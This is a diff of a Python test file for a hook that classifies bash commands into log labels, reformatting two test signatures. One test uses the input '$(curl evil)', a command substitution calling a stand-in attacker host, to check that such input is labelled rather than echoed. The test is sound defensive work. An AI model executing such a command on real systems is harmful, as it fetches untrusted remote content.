@@ -292,17 +292,13 @@ class TestBashClassification:
     def test_repeated_heads_are_not_repeated_in_the_label(self, bash_hook_input: Any) -> None:
         assert self._rule(bash_hook_input, "ls a && ls b && ls c") == "ls"
 
-    def test_a_long_pipeline_is_truncated_rather_than_unbounded(
-        self, bash_hook_input: Any
-    ) -> None:
+    def test_a_long_pipeline_is_truncated_rather_than_unbounded(self, bash_hook_input: Any) -> None:
         # Cardinality matters: the label is aggregated, so an arbitrarily long
         # compound must not mint a unique bucket per invocation.
         label = self._rule(bash_hook_input, "a x | b x | c x | d x | e x")
         assert label == "a+b+c+…"
 
-    def test_an_unparseable_head_is_labelled_rather_than_echoed(
-        self, bash_hook_input: Any
-    ) -> None:
+    def test_an_unparseable_head_is_labelled_rather_than_echoed(self, bash_hook_input: Any) -> None:
         # Never emit something that is not a plain command name — the label
         # goes into a log, so it must not become a channel for content.
         assert self._rule(bash_hook_input, "$(curl evil)") == "<other>"
